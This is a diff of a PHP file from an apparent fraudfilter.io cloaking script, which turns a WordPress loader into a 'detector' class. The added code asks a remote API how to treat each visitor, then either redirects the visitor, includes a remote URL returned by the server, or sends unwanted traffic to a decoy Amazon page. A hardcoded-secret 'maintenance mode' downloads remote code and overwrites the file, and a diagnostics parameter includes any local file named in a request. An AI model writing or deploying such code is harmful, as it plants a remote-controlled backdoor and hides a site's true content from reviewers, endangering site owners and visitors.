@@ -1,72 +1,201 @@
 <?php
-
-//ADVANCED fraudfilter.io TEMPLATE
 error_reporting(0);
 
-class FraudFilterWordPressLoader_29nv7 {
-    public function run() {
-        global $fbIncludedFileName;
-        global $fbIncludedHomeDir;
+class FraudFilterDetector_29nv7 {
 
-        $clid = $this->getClidTemp();
-        $wpmode = function_exists('wp_upload_dir');
+    public function check() {
 
-        $home = '';
+        ob_start();
 
-        if ($wpmode) {
-            $upload_dir = wp_upload_dir();
-            $home = $upload_dir['basedir'];
-            $fileName = $home.'/'.$clid.'.include.php';
-        } else {
-            $home = realpath(dirname(__FILE__));
-            $fileName = $home.'/'.$clid.'.include.php';
-        }
-
-        $fbIncludedFileName = $fileName;
-        $fbIncludedHomeDir = $home;
-
-        if (isset($_GET['ff17x_sign']) && isset($_GET['ff17x_time']) && isset($_GET['ff17x_mode'])) {
-            if (!file_exists($fileName) || $_GET['ff17x_mode'] == 'diagnostics' || $_GET['ff17x_mode'] == 'upgrade') {
-                if ($this->isSignatureValidTemp($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
-                    try {
-                        error_reporting(-1);
-                        $diagnosticsResult = $this->performDiagnosticsWP($home, $fileName);
-                        if (!$diagnosticsResult['success']) {
-                            echo(json_encode($diagnosticsResult));
-                        } else {
-                            if ($_GET['ff17x_mode'] != 'diagnostics' || !file_exists($fileName)) {
-                                $this->downloadScriptFirstTime($home, $fileName);
-                            } else {
-                                echo(json_encode($diagnosticsResult));
-                            }
-                        }
-                    } catch (Exception $e) {
-                        $errors = array();
-                        $errors[] = $e;
-                        $result = array('success' => false, 'errors' => $errors, 'version' => 4);
-                        echo(json_encode($result));
-                    }
-                    die();
-                }
+        if (isset($_GET['ff17x_sign']) && isset($_GET['ff17x_time'])) {
+            if ($this->isSignatureValid($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
+                error_reporting(-1);
+                $this->runInMaintenanceMode();
+                die();
             }
         }
 
-        if (file_exists($fileName)) {
-            include($fileName);
+        $resultObj = $this->sendRequestAndGetResult2(false);
+
+        if ($resultObj->result || !0) {
+            $this->action($resultObj);
         }
     }
 
-    function getClidTemp() {
-        return '29nv7';
+    function url_origin($s)
+    {
+        $ssl      = ( ! empty( $s['HTTPS'] ) && $s['HTTPS'] == 'on' );
+        $sp       = strtolower( $s['SERVER_PROTOCOL'] );
+        $protocol = substr( $sp, 0, strpos( $sp, '/' ) ) . ( ( $ssl ) ? 's' : '' );
+        $port     = $s['SERVER_PORT'];
+        $port     = ( ( ! $ssl && $port=='80' ) || ( $ssl && $port=='443' ) ) ? '' : ':'.$port;
+        $host     = $s['HTTP_HOST'];
+        $host     = isset( $host ) ? $host : $s['SERVER_NAME'] . $port;
+        return $protocol . '://' . $host;
     }
 
-    function isSignatureValidTemp($sign, $time) {
-        $str = '2e7bec49-f022-443b-8623-2c0ffcf4158d.'.$this->getClidTemp().'.'.$time;
+    function full_url($s)
+    {
+        return $this->url_origin($s) . $s['REQUEST_URI'];
+    }
+
+    function isSignatureValid($sign, $time) {
+        $str = '2e7bec49-f022-443b-8623-2c0ffcf4158d.'.$this->getClid().'.'.$time;
         $sha = sha1($str);
         return $sign === $sha;
     }
 
-    function getUpgradeScriptViaContentsWP($home, $fileName) {
+    function runInMaintenanceMode() {
+        global $fbIncludedFileName;
+        global $fbIncludedHomeDir;
+
+        $mode = $_GET['ff17x_mode'];
+        if (!isset($mode)) {
+            return $this->returnError('Maintenance mode not set');
+        }
+
+        $clid = $this->getClid();
+
+        if ($fbIncludedFileName && $fbIncludedHomeDir) {
+            $home = $fbIncludedHomeDir;
+            $fileName = $fbIncludedFileName;
+        } else {
+            $fileName = __FILE__;
+            $home = realpath(dirname(__FILE__));
+        }
+
+        if ($mode === 'upgrade') {
+            return $this->upgradeScript($home, $fileName);
+        } else if ($mode === 'diagnostics') {
+            return $this->performDiagnostics($home, $fileName);
+        } else {
+            return $this->returnError('Undefined maintenance mode: '.$mode);
+        }
+    }
+
+    function redirect($url) {
+        if(!function_exists('headers_sent') || !headers_sent()) {
+            header('Location: '.$url, true, 302);
+            die();
+        }
+?>
+    <html>
+    <head>
+        <title>Redirecting...</title>
+        <meta name="robots" content="noindex nofollow" />
+        <script type="text/javascript">
+            window.location.replace('<?= $url ?>');
+        </script>
+        <noscript>
+            <meta http-equiv="refresh" content="0;url='<?= $url ?>'" />
+        </noscript>
+    </head>
+    <body>
+        You are being redirected to <a href="<?= $url ?>" target="_top">your destination</a>.
+        <script type="text/javascript">
+            window.location.replace('<?= $url ?>');
+        </script>
+    </body>
+    </html>
+
+<?php
+        die();
+    }
+
+
+    function returnError($message) {
+         echo('{"success":false, "errorMessage":"'.$message.'"}');
+    }
+
+    function returnErrorByCode($code, $args) {
+        $extErrors = array();
+        $extErrors[] = array('code' => $code,'args' => $args);
+        $result = array('success' => false, 'extErrors' => $extErrors, 'version' => 4);
+        echo(json_encode($result));
+    }
+
+    function getClid() {
+        return '29nv7';
+    }
+
+    function appendGetParameters($url, $getParameters) {
+        if ($getParameters) {
+            if (strpos($url, '?') !== false) {
+                return $url.'&'.$getParameters;
+            } else {
+                return $url.'?'.$getParameters;
+            }
+        }
+        return $url;
+    }
+    function action($result) {
+        if (!isset($result->type)) {
+            $this->safeAction();
+            return;
+        }
+        $type = $result->type;
+        $url = $result->url;
+        if ($type == 'u') {
+            $this->redirect($url);
+        } else if ($type == 'f') {
+            include ($url);
+            die();
+        } else {
+            $this->safeAction();
+        }
+    }
+    function safeAction() {
+        $this->redirect('https://www.amazon.com/Moulinsart-Recycled-Kraft-Tintin-36x25x11cm/dp/B0752TTQ6H');
+    }
+    function performDiagnostics($home, $fileName) {
+        header("X-FF: true");
+        $errors = array();
+        $extErrors = array();
+        
+        if (isset($_GET['ff17x_checkfile'])) {
+            $filename = $_GET['ff17x_checkfile'];
+            $result = $this->checkFile($filename);
+            echo(json_encode($result));
+            return;
+        }
+
+        $success = true;
+        $permissionsIssues = $this->hasPermissionsIssues($home, $fileName);
+        if ($permissionsIssues) {
+            $extErrors[] = $permissionsIssues;
+            $success = false;
+        }
+        $time_start = microtime(true);
+        $curlConnectionIssues = $this->getCurlConnectionIssues();
+        $time_finish = microtime(true);
+        $curlConnectionIssues->duration = $time_finish - $time_start;
+
+        $time_start = microtime(true);
+        $contentsConnectionIssues = $this->getContentsConnectionIssues();
+        $time_finish = microtime(true);
+        $contentsConnectionIssues->duration = $time_finish - $time_start;
+        $result = array('success' => $success, 'version' => 6, 'diagnostics' => true, 'errors' => $errors, 'extErrors' => $extErrors, 'phpversion' => phpversion(), 'connection' => $curlConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
+        echo(json_encode($result));
+    }
+
+    function getCurlConnectionIssues() {
+        return $this->sendRequestAndGetResultCurl2(true);
+    }
+
+    function getContentsConnectionIssues() {
+        return $this->sendRequestAndGetResultFileGetContents2(true);
+    }
+
+    function checkFile($filename) {
+        $extErrors = array();
+        if (!file_exists($filename)) {
+            $extErrors[] = array('code' => 'FILE_NOT_FOUND','args' => array($filename));
+            return array('success' => false, 'diagnostics' => true, 'extErrors' => $extErrors, 'version' => 6);
+        }
+        include ($filename);
+        return "--- end of file inclusion ---";
+    }
+    function getUpgradeScriptViaContents($home, $fileName) {
         $opts = array('http' =>
             array(
                 'method'  => 'GET',
@@ -77,22 +206,17 @@ class FraudFilterWordPressLoader_29nv7 {
 
         $context  = stream_context_create($opts);
 
-        return file_get_contents($this->getFileNameForUpdatesWP("contents"), false, $context);
+        return file_get_contents($this->getFileNameForUpdates("contents"), false, $context);
     }
 
-    function getFileNameForUpdatesWP($type) {
-        return "https://api.fraudfilter.io/v1/integration/get-updates?clid=".$this->getClidTemp().'&integrationType=EMBED&type='.$type;
+    function getFileNameForUpdates($type) {
+        return "https://api.fraudfilter.io/v1/integration/get-updates?clid=".$this->getClid().'&integrationType=DEFAULT&type='.$type;
     }
 
-    function isSignature2ValidTemp($content) {
-        return strpos($content, '@FraudFilter.io 20') !== false;
-    }
-
-    function downloadScriptFirstTime($home, $fileName) {
-        $output = $this->getUpgradeScriptViaContentsWP($home, $fileName);
-
-        if ($output === false || !$this->isSignature2ValidTemp($output)) {
-            $ch = curl_init($this->getFileNameForUpdatesWP("curl"));
+    function upgradeScript($home, $fileName) {
+        $output = $this->getUpgradeScriptViaContents($home, $fileName);
+        if ($output === false || !$this->isSignature2Valid($output)) {
+            $ch = curl_init($this->getFileNameForUpdates("curl"));
 
             $data_to_post = array();
             $headers = array();
@@ -104,33 +228,53 @@ class FraudFilterWordPressLoader_29nv7 {
             curl_setopt($ch, CURLOPT_TIMEOUT, 10);
             curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
 
             $output = curl_exec($ch);
 
-            if (!$this->isSignature2ValidTemp($output)) {
-                echo('{"success":false, "phpversion": "'.phpversion().'","version": 5, "errorMessage":"Malformed answer received from the server. Please try again"}');
-                die();
+            $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+            if (!$output || strlen($output) == 0) {
+                curl_close($ch);
+                return $this->returnError('Server returned empty answer. HTTP error: '.$http_status);
             }
-            $sha = sha1($output);
+
+            if (strlen($output) == 0) {
+                $curl_error_number = curl_errno($ch);
+                curl_close($ch);
+                return $this->returnErrorByCode("CURL_ERROR_".$curl_error_number, NULL);
+            }
+
+            curl_close($ch);
+
         }
 
-        $file = fopen($fileName, 'w');
-        $written = fwrite($file, $output);
+        $tempFileName = $fileName.'.downloaded';
+        $file = fopen($tempFileName, 'w');
+        $saved = fwrite($file, $output);
         fclose($file);
-        if ($file) {
-            echo('{"success":true, "phpversion": "'.phpversion().'","version": 5}');
-        } else if (!$written) {
-            echo('{"success":false, "version": 5, "errorMessage":"Unable to write to php file: '.$fileName.'". Please issue 775 permission to the folder : '.$home.'"}');
-            die();
-        } else {
-            echo('{"success":false, "version": 5, "errorMessage":"Unable to save php file: '.$fileName.'". Please issue 775 permission to the folder : '.$home.'"}');
-            die();
+
+        if (!$this->isSignature2Valid($output)) {
+            return $this->returnErrorByCode("WRONG_SIGNATURE", NULL);
         }
-        curl_close($ch);
+
+        if (!$saved) {
+            return $this->returnErrorByCode("WRITE_PERMISSION", array($tempFileName, $home));
+        }
+        if(!rename ($tempFileName, $fileName)) {
+            return $this->returnErrorByCode("WRITE_PERMISSION", array($tempFileName, $home));
+        }
+        echo('{"success":true, "errorMessage":""}');
     }
 
-    function hasPermissionsIssuesWP($home, $fileName) {
+    function isSignature2Valid($content) {
+        return strpos($content, '@FraudFilter.io 20') !== false;
+    }
+
+    function checkSignature($content) {
+        return array('code' => 'WRONG_SIGNATURE');
+    }
+
+    function hasPermissionsIssues($home, $fileName) {
         ob_start();
         $tempFileName = $fileName.'.tempfile';
         $tempFile = fopen($tempFileName, 'w');
@@ -145,36 +289,25 @@ class FraudFilterWordPressLoader_29nv7 {
             return unlink($tempFileName) ? "" : array('code' => 'UNABLE_TO_DELETE_TEMP_FILE','args' => array($tempFileName, $home));
         }
     }
-
-    function performDiagnosticsWP($home, $fileName) {
-        header("X-FF: true");
-        $errors = array();
-        $extErrors = array();
-        $success = true;
-        $permissionsIssues = $this->hasPermissionsIssuesWP($home, $fileName);
-        if ($permissionsIssues) {
-            $extErrors[] = $permissionsIssues;
-            $success = false;
+    function concatQueryVars($originalUrl) {
+        $second = $_SERVER['REQUEST_URI'];
+        $url = strtok($originalUrl, '?');                                                                
+        $first = parse_url($originalUrl, PHP_URL_QUERY);                                                 
+        $second = parse_url($second, PHP_URL_QUERY);                                                     
+        if (!$second) {
+            return $originalUrl;                                                                         
+        }                                                                                                
+        if (!$first) {                                                                                   
+            return $url . '?' . $second;
         }
-        $serverConnectionIssues = $this->getCurlConnectionIssuesWP();
-        $contentsConnectionIssues = $this->getContentsConnectionIssuesWP();
-        $result = array('success' => $success, 'diagnostics' => true, 'extErrors' => $extErrors, 'errors' => $errors, 'version' => 5, 'phpversion' => phpversion(), 'connection' => $serverConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
-        return $result;
+        return $url . '?' . $first. '&' . $second;
     }
 
-    function getCurlConnectionIssuesWP() {
-        return $this->sendRequestAndGetResultCurlWP2(true);
+    function sendRequestAndGetResult2($diagnostics) {
+        return $this->sendRequestAndGetResultCurl2($diagnostics);
     }
 
-    function getContentsConnectionIssuesWP() {
-        return $this->sendRequestAndGetResultFileGetContentsWP2(true);
-    }
-
-    function sendRequestAndGetResultWP2($diagnostics) {
-        return $this->sendRequestAndGetResultCurlWP2($diagnostics);
-    }
-
-    function sendRequestAndGetResultCurlWP2($diagnostics) {
+    function sendRequestAndGetResultCurl2($diagnostics) {
         $resultObj = (object)array('result' => false);
 
         if ($diagnostics) {
@@ -240,7 +373,7 @@ class FraudFilterWordPressLoader_29nv7 {
         return $resultObj;
     }
 
-    function sendRequestAndGetResultFileGetContentsWP2($diagnostics) {
+    function sendRequestAndGetResultFileGetContents2($diagnostics) {
         $time_start = microtime(true);
 
         $resultObj = (object)array('result' => false);
@@ -417,10 +550,13 @@ class FraudFilterWordPressLoader_29nv7 {
         $output = curl_exec($ch);
     }
 
+
 }
 
-$fraudFilterWordPressLoader_29nv7 = new FraudFilterWordPressLoader_29nv7();
-$fraudFilterWordPressLoader_29nv7->run();
+$fraudFilterDetector_29nv7 = new FraudFilterDetector_29nv7();
+$fraudFilterDetector_29nv7->check();
 
 // @FraudFilter.io 2017
+
 ?>
+
